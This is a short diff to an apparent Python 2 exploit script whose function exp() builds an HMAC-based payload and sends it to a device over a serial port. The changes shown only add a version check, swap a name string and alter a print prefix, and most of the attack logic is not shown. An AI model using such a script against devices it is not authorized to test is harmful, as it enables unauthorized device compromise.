@@ -1,7 +1,10 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
-import serial, time
-import hmac, hashlib
+import time, sys
+if (sys.version_info > (3, 0)):
+    sys.stdout.write("Sorry not support python 3 ;( \n")
+    sys.exit(1)
+import serial, hmac, hashlib
 
 
 def exp(i):
@@ -16,7 +19,7 @@ def exp(i):
 
     company_name = "\x46\x00"
     #name = "deaddeadbeef".decode('hex')
-    name = "AIS666"
+    name = "zet666"
     random_num = [0x01, 0x02, 0x03]
     count = i
 
@@ -44,7 +47,7 @@ def exp(i):
 
     ser.write("b" + payload)
     ser.readline()
-    print "[+] " + ser.readline()
+    print "[msg] " + ser.readline()
     time.sleep(4)
 
 
